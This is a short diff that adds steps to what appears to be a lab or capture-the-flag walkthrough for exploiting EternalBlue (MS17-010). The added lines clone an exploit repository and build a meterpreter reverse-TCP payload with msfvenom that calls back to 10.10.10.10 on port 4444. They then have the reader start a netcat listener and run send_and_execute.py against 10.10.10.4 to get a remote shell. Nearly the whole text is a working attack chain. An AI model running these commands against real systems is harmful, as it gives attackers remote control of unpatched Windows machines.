@@ -28,5 +28,16 @@ I will be exploiting eternal blue using custom exploits from this git repo
 
 git clone https://github.com/helviojunior/MS17-010.git
 
+cd MS17-010
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe
+
+open a netcat session on port 4444
+
+Run these command : python send_and_execute.py 10.10.10.4 shell.exe and you will get a reverse shell on port 4444
+
+
+
+
 
 
